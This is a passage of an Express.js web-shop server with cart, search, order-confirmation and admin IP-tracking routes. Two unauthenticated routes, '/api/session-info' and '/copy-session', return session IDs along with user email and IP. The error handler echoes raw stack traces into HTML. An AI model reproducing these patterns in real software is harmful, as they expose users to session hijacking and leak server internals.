    saveCart(userId, updatedCart);
    
    res.json({ success: true, cart: updatedCart, message: 'Item removed from cart' });
  } catch (error) {
    console.error('Error removing from cart:', error);
    res.status(500).json({ error: 'Failed to remove item from cart' });
  }
});

// Clear cart
app.delete('/api/cart/clear', requireAuth, (req, res) => {
  try {
    const userId = req.session.user.id;
    saveCart(userId, []);
    res.json({ success: true, message: 'Cart cleared' });
  } catch (error) {
    console.error('Error clearing cart:', error);
    res.status(500).json({ error: 'Failed to clear cart' });
  }
});

// Search products route
app.get('/api/search', (req, res) => {
  try {
    const { q: query, category, minPrice, maxPrice } = req.query;
    
    let results = [...posts];
    
    // Text search
    if (query) {
      const searchTerm = query.toLowerCase();
      results = results.filter(product => 
        product.name.toLowerCase().includes(searchTerm) ||
        product.description.toLowerCase().includes(searchTerm)
      );
    }
    
    // Price filtering
    if (minPrice) {
      results = results.filter(product => product.price >= parseFloat(minPrice));
    }
    
    if (maxPrice) {
      results = results.filter(product => product.price <= parseFloat(maxPrice));
    }
    
    // Sort by relevance (exact matches first)
    if (query) {
      results.sort((a, b) => {
        const aName = a.name.toLowerCase();
        const bName = b.name.toLowerCase();
        const searchTerm = query.toLowerCase();
        
        const aExact = aName === searchTerm;
        const bExact = bName === searchTerm;
        const aStarts = aName.startsWith(searchTerm);
        const bStarts = bName.startsWith(searchTerm);
        
        if (aExact && !bExact) return -1;
        if (!aExact && bExact) return 1;
        if (aStarts && !bStarts) return -1;
        if (!aStarts && bStarts) return 1;
        
        return aName.localeCompare(bName);
      });
    }
    
    res.json({ 
      results, 
      total: results.length,
      query: query || '',
      filters: { category, minPrice, maxPrice }
    });
  } catch (error) {
    console.error('Search error:', error);
    res.status(500).json({ error: 'Search failed' });
  }
});

// Cart page route
app.get('/cart', requireAuth, (req, res) => {
  const userId = req.session.user.id;
  const cart = getCart(userId);
  
  res.render('cart', {
    user: req.session.user,
    cart,
    posts
  });
});

// Confirmation page route
app.get('/confirmation', requireAuth, (req, res) => {
  const { orderId } = req.query;
  
  if (!orderId) {
    return res.redirect('/');
  }
  
  // Find the order
  const order = customerOrders.find(o => o.id === orderId);
  
  if (!order) {
    return res.redirect('/');
  }
  
  res.render('confirmation', {
    user: req.session.user,
    order
  });
});

// Session copying functionality
app.get('/api/session-info', (req, res) => {
  const sessionInfo = {
    sessionId: req.sessionID,
    userId: req.session.user ? req.session.user.id : null,
    userEmail: req.session.user ? req.session.user.email : null,
    timestamp: new Date().toISOString(),
    userAgent: req.headers['user-agent'],
    ipAddress: getClientIP(req)
  };
  
  res.json(sessionInfo);
});

// Route to copy session to clipboard (for frontend use)
app.get('/copy-session', (req, res) => {
  const sessionData = {
    sessionId: req.sessionID,
    userId: req.session.user ? req.session.user.id : null,
    userEmail: req.session.user ? req.session.user.email : null,
    timestamp: new Date().toISOString(),
    userAgent: req.headers['user-agent'],
    ipAddress: getClientIP(req)
  };
  
  res.json({
    success: true,
    message: 'Session data copied to clipboard',
    data: sessionData
  });
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Error:', err);
  res.status(500).send('<pre style="color:red">' + (err.stack || err) + '</pre>');
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});

// Route to get visitor IPs for admin
app.get('/admin/visitor-ips', requireAdmin, (req, res) => {
  res.json({ success: true, data: visitorIPs });
});

// Route to clear IP tracking data
app.delete('/admin/clear-ips', requireAdmin, (req, res) => {
  visitorIPs = [];
  saveData(IP_TRACKING_FILE, visitorIPs);
  res.json({ success: true, message: 'IP tracking data cleared' });
});